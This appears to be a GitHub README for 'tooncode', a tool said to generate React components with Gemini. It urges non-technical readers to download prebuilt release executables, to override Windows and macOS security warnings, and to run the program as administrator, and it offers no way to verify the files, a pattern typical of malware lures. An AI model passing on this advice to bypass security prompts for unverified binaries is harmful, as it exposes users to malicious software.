# 🧩 tooncode - Generate React components with Gemini AI

[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Juarez806/tooncode/releases)

A small tool that creates React UI components from simple prompts. tooncode uses Google Gemini to help you generate component code, props, and styling. You do not need programming skills to download and run the app. Follow the steps below.

## 🚀 What this does
- Turn a short description into a ready-to-use React component.
- Produce component file, styles, and a usage example.
- Work from your desktop using a simple command-line interface (CLI) app.

## 📦 Releases (Download)
Visit this page to download:  
https://github.com/Juarez806/tooncode/releases

Click the badge above to go to the Releases page. The page lists ready-to-run files for Windows, macOS, and Linux. Choose the file that matches your computer and follow the steps in the next section.

## 💻 System requirements
- Windows 10 or later, macOS 10.15 (Catalina) or later, or a modern Linux (Ubuntu 20.04+).
- 200 MB free disk space.
- Internet access for the AI features.
- A standard user account with permissions to run apps and open files.

If your computer shows a security prompt when you open an app, allow the app to run. The Releases page contains signed files where available.

## ⬇️ Download & Install
Visit this page to download:  
https://github.com/Juarez806/tooncode/releases

How to pick a file:
- Windows: choose a file ending in .exe or .zip. If you get a .zip, open it and double-click the .exe inside.
- macOS: choose a .dmg or .zip. Open the .dmg and drag the app to Applications. For a .zip, open it and move the app to Applications.
- Linux: choose an .AppImage or .tar.gz. For .AppImage, make it executable and double-click it. For .tar.gz, extract and run the included binary.

Step-by-step (Windows)
1. Go to the Releases page: https://github.com/Juarez806/tooncode/releases
2. Click the Windows asset (file ending in .exe or .zip).
3. Save the file to your Downloads folder.
4. If .zip, double-click the zip to open it and move the .exe to a folder like Desktop or Program Files.
5. Double-click the .exe to open the app. If Windows warns you, choose "Run anyway" or "More info" then "Run".

Step-by-step (macOS)
1. Go to the Releases page: https://github.com/Juarez806/tooncode/releases
2. Click the macOS asset (file ending in .dmg or .zip).
3. Open the .dmg and drag the tooncode app to Applications, or unzip and move the app.
4. Open Finder, go to Applications, and double-click tooncode. If macOS blocks it, open the app using Control-click > Open, then confirm.

Step-by-step (Linux)
1. Go to the Releases page: https://github.com/Juarez806/tooncode/releases
2. Download the .AppImage or .tar.gz for Linux.
3. If .AppImage: open a terminal in the download folder and run:
   - chmod +x tooncode.AppImage
   - ./tooncode.AppImage
4. If .tar.gz: extract and run the included binary:
   - tar -xzf tooncode-*.tar.gz
   - cd tooncode-*
   - ./tooncode

If the app requires extra permissions, the system will ask. Allow the permission to run the program.

## ▶️ Quick start — Generate your first component
This section shows the simplest flow. You will open a terminal or command prompt and run a short command. If you prefer, you can use a terminal app provided with the download.

1. Open the app or a terminal:
   - Windows: open Command Prompt (search "cmd") or double-click the app.
   - macOS: open Terminal (Applications > Utilities > Terminal).
   - Linux: open Terminal.

2. Run the generator with a short prompt. Replace the prompt text in quotes with your idea:
   - tooncode "A blue button with rounded corners and an icon"

What happens:
- The app sends the prompt to Gemini and receives component code.
- The app saves the component file to a folder named tooncode-output in your home folder.
- The app prints the location of the saved files.

3. Open the tooncode-output folder to view the files. You will find:
   - Component file (e.g., Button.jsx or Button.tsx)
   - CSS or Tailwind styles (e.g., Button.css or tailwind classes)
   - A README with usage instructions and example code

If you used the GUI version of the download, the app will show a simple input box for the prompt and a button labeled Generate. Type your prompt and click Generate.

## ✨ Example prompts you can try
- "A primary submit button with a check icon"
- "A card with image, title, and small description"
- "A form input with label, hint text, and error state"
- "A responsive header with logo and menu icon"

Use short, clear descriptions. The app will make reasonable choices for colors and layout.

## 🔧 Common options and settings
- Output folder: change where files save.
- Style system: choose CSS, Tailwind, or styled-components.
- Language: pick JavaScript or TypeScript.
- Accessibility: toggle accessible labels and keyboard support.

You can change these in the GUI settings or by adding flags to the CLI:
- --output /path/to/folder
- --style css|tailwind|styled
- --lang js|ts
- --accessibility on|off

If you do not know what a flag means, keep the defaults.

## 🐞 Troubleshooting
- The app does not start:
  - On Windows, right-click the .exe and choose Run as administrator once.
  - On macOS, use Control-click > Open to bypass security for the first run.
  - On Linux, make the file executable: chmod +x tooncode.AppImage

- The app cannot reach the internet:
  - Check your Wi-Fi or Ethernet connection.
  - If your workplace uses a proxy, ask your IT team for help.

- The output looks broken or missing:
  - Open the generated README in the output folder for instructions.
  - Try a clearer prompt. Short phrases work best.

- The AI output contains unexpected words:
  - Re-run with a clearer prompt or add style preferences like "use neutral colors" or "no animations".

## ❓ FAQ
Q: Do I need a Google account?
A: The app uses an API key if required. The Releases page and the app include steps to link your account if needed. If the app asks for a key, follow the in-app instructions.

Q: Can I edit the generated code?
A: Yes. The app saves plain code files you can open and edit in any text editor.

Q: Is this safe for work projects?
A: The output contains code you can review and modify. Check the generated files before using them in production.

Q: Where does the output save?
A: By default, the app creates a folder named tooncode-output in your home folder. You can change this in settings.

## 🔁 Update
- Check the Releases page regularly for new versions: https://github.com/Juarez806/tooncode/releases
- Download the latest file for your OS and replace the old app file.
- The app will keep your output files in the output folder.

## 🗑️ Uninstall
- Windows: delete the .exe and the output folder.
- macOS: move the app from Applications to Trash.
- Linux: delete the AppImage or extracted folder and any shortcuts.

Remove the tooncode-output folder in your home to delete generated components.

## 🧾 License & Credits
- License: Check the LICENSE file on the project page.
- Built with Google Gemini for AI generation.
- Inspired by popular component generators and React patterns.

## 📬 Support
If you need help or want to report a bug:
- Visit the project Releases page for downloads and release notes: https://github.com/Juarez806/tooncode/releases
- Open an issue on the repository or check the README in the release assets for contact steps.

---

[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Juarez806/tooncode/releases)